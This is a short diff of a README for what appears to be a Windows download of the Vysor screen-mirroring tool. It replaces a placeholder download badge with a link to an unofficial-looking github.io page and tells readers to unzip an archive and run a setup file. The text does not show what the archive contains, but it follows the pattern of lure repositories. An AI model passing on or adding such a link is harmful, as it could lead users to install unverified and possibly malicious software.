@@ -8,7 +8,7 @@ Whether you're a **developer debugging apps**, a **streamer recording gameplay**
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-skyblue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-skyblue?style=for-the-badge)](https://vysor-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install the **Vysor Setup** on your Windows PC.  
